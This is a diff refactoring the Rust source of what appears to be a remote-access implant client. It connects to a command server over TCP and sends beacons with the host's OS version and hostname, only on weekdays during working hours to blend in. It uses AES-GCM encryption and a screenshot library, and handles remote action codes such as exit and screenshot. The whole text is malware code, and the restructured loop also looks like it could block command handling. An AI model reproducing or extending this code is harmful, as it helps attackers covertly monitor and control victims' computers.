@@ -1,12 +1,12 @@
 use std::net::{SocketAddr, TcpStream};
-use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::process::Output;
 use std::net::IpAddr;
 use std::io::{Read, Write};
 use std::process::Command;
 use std::sync::{LazyLock, Arc, Mutex};
-use std::fs::{File, create_dir};
-use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
+use std::fs::File;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use std::thread;
 use std::error::Error;
 use aes_gcm::aead::Aead;
@@ -17,7 +17,7 @@ use sha2::digest::generic_array::GenericArray;
 use sysinfo::System;
 use rand::{Rng, RngCore};
 use screenshots::{Screen, image};
-use chrono::{Local, Datelike, Timelike};
+use chrono::Local;
 use sha2::{Sha256, Digest, Sha512};
 use pbkdf2::pbkdf2_hmac;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
@@ -46,8 +46,8 @@ const SESSION_ID_LENGTH: usize = 32;
 // Global variables (using Arc<Mutex<>> for shared mutable state)
 static CLIENT: LazyLock<Arc<Mutex<Option<TcpStream>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
 static LOG_STREAM: LazyLock<Arc<Mutex<Option<File>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
-static START_TIME: LazyLock<SystemTime> = LazyLock::new(|| SystemTime::now());
-static EXIT_PROCESS: LazyLock<Arc<Mutex<bool>>> = LazyLock::new(|| Arc::new(Mutex::new(false)));
+static START_TIME: LazyLock<SystemTime> = LazyLock::new(SystemTime::now);
+static EXIT_PROCESS: AtomicBool = AtomicBool::new(false);
 static SESSION_ID: LazyLock<Arc<Mutex<Option<String>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
 
 fn log_it(message: &str) {
@@ -165,14 +165,14 @@ fn beacon_interval_thread() {
 
         // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
         if day_of_week >= 1 && day_of_week <= 5 && hours >= 7 && hours <= 19 {
-            send_beacon();
+            let _ = send_beacon();
         }
     }
 }
 
 fn start_beacon_interval() -> thread::JoinHandle<()> {
     // Send the first beacon
-    send_beacon();
+    let _ = send_beacon();
 
     // Create and start the thread
     thread::spawn(beacon_interval_thread)
@@ -203,7 +203,7 @@ fn send_command(response: serde_json::Value) -> Result<(), Box<dyn Error>> {
 }
 
 fn send_beacon() -> Result<(), Box<dyn Error>> {
-    let response: serde_json::Value = serde_json::json!({
+    send_command(serde_json::json!({
         "response": {
             "beacon": true,
             "version": CVER,
@@ -213,8 +213,9 @@ fn send_beacon() -> Result<(), Box<dyn Error>> {
             "osver": System::os_version().unwrap_or_default(),
             "hostname": System::host_name().unwrap_or_default()
         }
-    });
-    send_command(response)
+    }))?;
+
+    Ok(())
 }
 
 fn utf8_to_16(s: &str) -> Vec<u16> {
@@ -346,11 +347,7 @@ fn get_uptime() -> Result<(), Box<dyn Error>> {
     let uptime: Duration = SystemTime::now().duration_since(start)?;
     let formatted_uptime: String = format_time(uptime.as_millis() as u64);
     
-    send_command(serde_json::json!({
-        "response": {
-            "data": formatted_uptime
-        }
-    }))?;
+    send_command(serde_json::json!({"response":{"data": formatted_uptime}}))?;
 
     Ok(())
 }
@@ -377,7 +374,7 @@ fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
             get_uptime()?;
         },
         "di" => {
-            *EXIT_PROCESS.lock().unwrap() = true;
+            EXIT_PROCESS.store(true, Ordering::Relaxed);
             std::process::exit(0);
         },
         "ss" => {
@@ -405,19 +402,11 @@ fn connect_to_server() -> Result<(), Box<dyn Error>> {
                 let session_id: String = get_session_id(peer_addr)?;
                 *SESSION_ID.lock().unwrap() = Some(session_id);
 
-                send_beacon()?;
-
-                let beacon_interval: u64 = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
-                let start_time: Instant = Instant::now();
-
                 loop {
-                    if start_time.elapsed().as_millis() >= beacon_interval as u128 {
-                        let now: chrono::DateTime<Local> = Local::now();
-                        if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
-                            send_beacon()?;
-                        }
-                        break;
-                    }
+                    let beacon_thread = start_beacon_interval();
+
+                    // Wait for the beacon thread to finish
+                    beacon_thread.join().unwrap();
 
                     let mut buffer = [0; 1024];
                     match stream.read(&mut buffer) {
@@ -439,7 +428,7 @@ fn connect_to_server() -> Result<(), Box<dyn Error>> {
                     }
                 }
 
-                if *EXIT_PROCESS.lock().unwrap() {
+                if EXIT_PROCESS.load(Ordering::Relaxed) {
                     return Ok(());
                 }
             }
@@ -459,20 +448,13 @@ fn connect_to_server() -> Result<(), Box<dyn Error>> {
     }
 }
 
-fn main() -> Result<(), Box<dyn Error>> {
-    if LOGGING {
-        let logs_dir: &Path = Path::new("logs");
-        if !logs_dir.exists() {
-            create_dir(logs_dir)?;
-        }
-        let log_file: PathBuf = logs_dir.join("client.log");
-        *LOG_STREAM.lock().unwrap() = Some(File::create(log_file)?);
-    }
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    *LOG_STREAM.lock().unwrap() = Some(File::options().append(true).create(true).open("client.log")?);
+    
+    connect_to_server()?;
 
-    connect_to_server();
+    // Clean up
+    *LOG_STREAM.lock().unwrap() = None;
 
-    let beacon_thread = start_beacon_interval();
-
-    // Wait for the thread to finish
-    beacon_thread.join().unwrap();
+    Ok(())
 }
